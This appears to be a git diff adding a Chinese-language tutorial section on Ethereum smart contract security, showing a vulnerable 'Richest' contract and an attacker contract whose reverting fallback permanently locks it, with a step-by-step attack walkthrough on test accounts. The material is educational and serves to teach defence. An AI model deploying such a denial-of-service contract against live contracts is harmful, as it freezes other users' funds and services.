@@ -3079,7 +3079,7 @@ Solidity 中 `<address>.transfer()`，`<address>.send()` 和 `<address>.call.val
 
  `<address>.transfer()`
 
-- 当发送失败时会 throw; 回滚状态
+- 当发送失败时会 `throw`，回滚状态
 - 只会传递 2300 Gas 供调用，防止重入（reentrancy）
 
 `<address>.send()`
@@ -3569,6 +3569,86 @@ contract OwnerWallet {
 #### 真实世界的例子：Rubixi
 
 [Rubixi](https://etherscan.io/address/0xe82719202e5965Cf5D9B6673B7503a3b92DE20be#code) 合约中的构造函数一开始叫做 `DynamicPyramid` ，但合约名称在部署之前已改为 `Rubixi` 。构造函数的名字没有改变，因此任何用户都可以成为 `creator` 。
+
+### 以太坊智能合约安全：未初始化的存储指针
+
+### 以太坊智能合约安全：从合约中提款
+
+####  transfer 转账失败
+
+> `Richest` 合约中，任何人支付高于前一个人所支付的以太坊，即，称为最富有的人
+
+```javascript
+pragma solidity ^0.4.24;
+
+contract Richest {
+    address public richest;
+    uint public mostSent;
+
+    constructor() public payable {
+        richest = msg.sender;
+        mostSent = msg.value;
+    }
+
+    function becomeRichest() public payable returns (bool) {
+        if (msg.value > mostSent) {
+            // 这一行会导致问题
+            richest.transfer(msg.value);
+            richest = msg.sender;
+            mostSent = msg.value;
+            return true;
+        } else {
+            return false;
+        }
+    }
+}
+
+contract Test {
+    Richest public target_;
+
+    constructor(address _target)  public payable {
+        target_ = Richest(_target);
+    }
+
+    function test() public payable {
+        target_.becomeRichest.value(msg.value)();
+    }
+
+    function () public payable {
+        revert("oops");
+    }
+}
+```
+
+**存在的问题：**攻击者可以给这个合约设下陷阱，使其进入不可用状态，比如通过使一个 `fallback` 函数会失败的合约成为 `richest` （可以在 `fallback` 函数中调用 `revert()` 或者直接在 fallback 函数中使用超过 2300 gas 来使其执行失败）。这样，当这个合约调用 `transfer` 来给“下过毒”的合约发送资金时，调用会失败，从而导致 `becomeRichest` 函数失败，这个合约也就被永远卡住了。
+
+详细的攻击过程如下：
+
+- 使用账户 `0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db` 部署 `Richest` 合约，得到合约地址 `0xe46b2d8b3a5ccf2df628468dee2f3ec1e85e7a28`
+
+![](pic\blockchain\deploy_richest.png)
+
+- 使用账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` 部署攻击合约 `Test`
+
+![](pic\blockchain\deploy_test.png)
+
+- 使用账户 `0x14723a09acff6d2a60dcdf7aa4aff308fddc160c` 调用 `Richest` 合约接口 `becomeRichest()` 并存入 2 以太坊，成为最富有的人
+
+![](pic\blockchain\call_become_richest.png)
+
+![](pic\blockchain\call_become_richest2.png)
+
+- 使用账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` 调用攻击合约 `Test` 接口 `test()`，并存入 3 以太坊
+
+![](pic/blockchain/call_test.png)
+
+- 此时查看最富有的人变成了攻击合约 `Test`，金额变为了 3 以太坊
+
+![](pic/blockchain/call_become_richest3.png)
+
+- 使用账户 `0xdd870fa1b7c4700f2bd7f44238821c26f7392148` 调用 `Richest` 合约接口 `becomeRichest()` 并存入 10 以太坊，此时，由于触发攻击合约中的 `fallback` 函数，进而调用 `revert()`
+
+![](pic/blockchain/call_fallback.png)
 
 ## 比特币
 
